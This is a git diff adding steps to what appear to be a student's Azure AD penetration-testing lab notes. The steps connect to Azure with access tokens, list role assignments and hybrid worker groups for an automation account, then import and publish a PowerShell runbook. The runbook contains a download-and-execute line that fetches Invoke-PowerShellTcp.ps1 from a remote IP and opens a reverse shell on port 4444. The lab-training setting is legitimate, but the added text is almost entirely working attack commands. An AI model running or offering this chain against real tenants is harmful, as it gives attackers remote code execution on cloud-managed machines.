@@ -1261,21 +1261,32 @@ $aadtoken = ''
 Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -AccountId <ID>
 ```
 
-####
-
-####
+#### Get the role assigned of the automation accounts
+- Check for the Roledefinitionn
+```
+Get-AzRoleAssignment -Scope /subscriptions/b413826f-108d-4049-8c11-d52d5d388768/resourceGroups/Engineering/providers/Microsoft.Automation/automationAccounts/HybridAutomation
 ```
 
+#### Check if a hybrid worker is in use by the automation account
+```
+Get-AzAutomationHybridWorkerGroup -AutomationAccountName HybridAutomation -ResourceGroupName Engineering
 ```
 
-####
+#### Import Powershell runbook
+```
+Import-AzAutomationRunbook -Name student38 -Path C:\AzAD\Tools\student38.ps1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Type PowerShell -Force -Verbose
 ```
 
+#### Contents op studentx.ps1 for reverse shell
+```
+IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-PowerShellTcp.ps1")
+
+reverse -Reverse -IPAddress 172.16.150.38 -Port 4444
 ```
 
-####
+#### Public the automation runbook to the vm
 ```
-
+Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
 ```
 
 ####
